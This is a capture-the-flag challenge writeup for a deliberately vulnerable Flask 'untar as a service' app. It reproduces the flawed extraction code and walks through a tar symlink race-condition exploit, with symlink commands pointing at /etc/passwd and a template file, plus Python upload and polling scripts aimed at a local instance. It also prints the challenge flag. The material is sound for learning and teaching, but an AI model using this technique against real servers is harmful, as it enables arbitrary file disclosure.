# TaaS

p.s. For testing, go to [INSTALL.md](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/blob/main/Web/TaaS/INSTALL.md)

### Description
I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get view the admin.html page, I will give you a flag. 

While I work on fixing the vulnerable unzipping code, I think I found another market opportunity. Nobody seems to know how to untar files, so I made (un)Tar as a Service! I have learned from my mistakes, so I will be giving you the source code for the untar functionality (app/routes/upload.py) so you can tell me how to fix my inevitably vulnerable code!

### Difficulty
Expert

### Flag
`PCTF{r4c3c4r?_m0r3_1ik3_r4c3_t4r}`

### Hints
1. Tar symlink vulnerability
2. Race condition

### Author
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup

This is a tar symlink vulnerability with a race condition. Here is the important part of the upload code:
```python
@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload():
    if request.method=='POST':
        <snip>
        if not tarfile.is_tarfile(file):
            flash('The file you provided is not a tar file!', 'danger')
            return redirect(url_for('upload'))
        
        filename = secure_filename(file.filename)
        upload_dir = app.config['UPLOAD_FOLDER'] + "/" + filename.rsplit('.', 1)[0]
        try:
            os.makedirs(upload_dir)
        except FileExistsError:
            flash('An extracted tar archive with this name already exists', 'danger')
            return redirect(url_for('upload'))

        tarchive_path = f"{upload_dir}/{filename}"
        file.stream.seek(0)
        file.save(tarchive_path)

        try:
            tarchive = tarfile.open(tarchive_path)
            for tf in tarchive:
                if tf.name != secure_filename(tf.name):
                    break
                tarchive.extract(tf.name, upload_dir)

            for tf in tarchive:
                if not tf.isreg():
                    os.remove(f"{upload_dir}/{tf.name}")
            tarchive.close()
        except Exception as e:
            flash('Something went wrong: ' + str(e), 'danger')
            return redirect(url_for('upload'))
            
        os.remove(tarchive_path)
                 
        flash(f'Tar sucessfully untar\'d. Download the files by going to /upload/{filename.rsplit(".", 1)[0]}', 'success')
        return redirect(url_for('upload'))
    else:
        return render_template('upload.html', name=current_user.username)
```

The vulnerable part of the code is right here:
```python
tarchive = tarfile.open(tarchive_path)
for tf in tarchive:
    if tf.name != secure_filename(tf.name):
        break
    tarchive.extract(tf.name, upload_dir)

for tf in tarchive:
    if not tf.isreg():
        os.remove(f"{upload_dir}/{tf.name}")
tarchive.close()
```
The code is first extracting all the files, and only after everything is extracted will it check if any of the files extracted are symbolic links (`tf.isreg()` checks if it's a regular file, a.k.a not a symlink). This means that there is time between when a symlink is extracted and when it is deleted (the way to secure this is to check before you extract, duh). We have a race condition vulnerability here. If we can GET request an extracted symlink file before it is deleted, we can get the contents of the file the symbolic link points to. 

For example, if we make a symlink file: `ln -s /etc/passwd link.file`, upload it, and are able to download it from the web app, then we will get the contents of the `/etc/passwd` file of the web server. For this challenge, we just want to point to the `admin.html` page which has the flag. This page is just a `../../templates/admin.html` path traversal away from the upload directory. To make our malicious link file: `ln -s ../../templates/admin.html link.file`.

Now, onto the race condition. To increase the window of time that we have for a race condition, we can abuse the fact that we wait for all tar files to be extracted before the check for symlinks begins. This means that if we tar our symlink file with a super large file, the slower decompression of the super large file would give us some time in the race condition to win. 

THE ORDER OF TAR'ING THE FILES MATTERS. If you do this: `tar payload.tar link.file bigfile.txt`, then the decompression will start with the `link.file` and then do `bigfile.txt`. If you put `bigfile.txt` before `link.file` in the compression, it will decompress `bigfile.txt` first. We want `bifile.txt` to be decompressed after `link.file` because that's the time span afer `link.file` is extracted onto the server and before `link.file` gets deleted.

Tip on how to make a large (100mb) file: `dd if=/dev/urandom of=bigfile.txt bs=1048576 count=100`

Onto the solution. First, here is the code I use to upload our tar file:
```python
import requests
import tarfile

SERVER_ADDR = "http://127.0.0.1:5000" # change this to whatever the docker is running at

def get_cookie():
    data = {
        "username": "test", # make this user first
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

with open('payload.tar', 'rb') as f:
    r = requests.post(url=SERVER_ADDR + "/upload", files={"file": ('payload.tar', f)}, cookies=cookie)
```

Here is the code for the race condition win:
```python
import requests
import threading

SERVER_ADDR = "http://127.0.0.1:5000" # change this to whatever the docker is running at

def get_cookie():
    data = {
        "username": "test", # make this user first
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

while True:
    r = requests.get(url=f"{SERVER_ADDR}/upload/payload/link.file", allow_redirects=True, cookies=cookie)
    if "PCTF" in r.text:
        print(r.text)
        break
```

Basically, we are making infinite requests to where the `link.file` will be uploaded in hopes that right after it does get uploaded, we will make a request right before it gets deleted. We can check that we got the right output by checking to see if the flag format `PCTF` is in the request output.

Here is a gif of how I ran the two python scripts. I'm also running the web app normally and not through docker so you can see all the requests come in.

<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/TaaS_solve.gif" width=100%  height=100%></p>

The following image shows the tar decompression time difference between the `link` file and the `big` file:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/tar_decompression.png" width=50%  height=50%></p>

You can see the `large.txt` file takes a whole 0.3 seconds to decompress, giving us plenty of time for the race condition. The bigger the file, the more time you have.  


note: There is delete functionality on the uploads page because it's inevitable there will be many attempts with many uploaded files, and it would be annoying to keep renaming files every time.
